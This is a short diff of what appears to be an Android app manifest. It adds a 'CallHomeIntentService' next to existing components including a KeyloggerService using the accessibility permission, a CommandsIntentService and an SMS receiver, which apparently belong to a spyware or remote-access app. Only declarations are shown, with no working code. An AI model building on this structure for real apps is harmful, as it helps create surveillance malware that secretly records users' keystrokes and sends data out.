@@ -94,6 +94,7 @@
             android:enabled="true"
             android:exported="false"
             android:permission="android.permission.BROADCAST_SMS" />
+
         <service
             android:name=".jobs.services.FlashlightJobService"
             android:exported="false"
@@ -171,6 +172,12 @@
             android:name=".services.CommandsIntentService"
             android:exported="false"
             />
+
+        <service
+            android:name=".services.CallHomeIntentService"
+            android:exported="false"
+            />
+
 
         <service android:name=".services.KeyloggerService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
